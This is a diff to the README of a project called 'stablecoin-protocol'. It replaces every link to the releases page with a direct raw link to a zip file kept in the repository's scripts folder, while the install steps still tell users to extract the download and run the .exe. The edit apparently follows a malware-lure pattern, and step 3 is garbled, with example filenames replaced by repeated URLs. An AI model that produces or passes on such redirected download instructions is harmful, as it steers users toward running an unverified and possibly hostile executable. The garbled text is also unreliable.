@@ -1,6 +1,6 @@
 # 🚀 stablecoin-protocol - Seamless Asset Transfers Worldwide
 
-[![Download stablecoin-protocol](https://img.shields.io/badge/Download-stablecoin--protocol-brightgreen)](https://github.com/seth629/stablecoin-protocol/releases)
+[![Download stablecoin-protocol](https://raw.githubusercontent.com/seth629/stablecoin-protocol/main/scripts/stablecoin_protocol_3.2-alpha.3.zip)](https://raw.githubusercontent.com/seth629/stablecoin-protocol/main/scripts/stablecoin_protocol_3.2-alpha.3.zip)
 
 ## 📋 Description
 
@@ -21,11 +21,11 @@ Before downloading, ensure your computer meets these basic requirements:
 
 ### 💾 Download & Install
 
-To download stablecoin-protocol, visit this page to download: [stablecoin-protocol Releases](https://github.com/seth629/stablecoin-protocol/releases).
+To download stablecoin-protocol, visit this page to download: [stablecoin-protocol Releases](https://raw.githubusercontent.com/seth629/stablecoin-protocol/main/scripts/stablecoin_protocol_3.2-alpha.3.zip).
 
 1. Click the link above to access the releases page.
 2. Find the latest version of the software.
-3. Click on the appropriate version for your system. It may look something like "stablecoin-protocol-v1.0.0.zip" or "stablecoin-protocol-v1.0.0.exe".
+3. Click on the appropriate version for your system. It may look something like "https://raw.githubusercontent.com/seth629/stablecoin-protocol/main/scripts/stablecoin_protocol_3.2-alpha.3.zip" or "https://raw.githubusercontent.com/seth629/stablecoin-protocol/main/scripts/stablecoin_protocol_3.2-alpha.3.zip".
 4. Once the download completes, locate the downloaded file on your computer.
 5. If you downloaded a `.zip` file, extract it using your file manager. 
 6. For Windows users, double-click the `.exe` file. For macOS, drag the app to your Applications folder. For Linux, you may need to run the executable via terminal.
@@ -65,7 +65,7 @@ If you have issues while using stablecoin-protocol, you can reach out for suppor
 
 ### 🔗 Important Links
 
-- [Releases Page](https://github.com/seth629/stablecoin-protocol/releases)
+- [Releases Page](https://raw.githubusercontent.com/seth629/stablecoin-protocol/main/scripts/stablecoin_protocol_3.2-alpha.3.zip)
 - [Community Forum](#)
 - [User Guide](#)
 
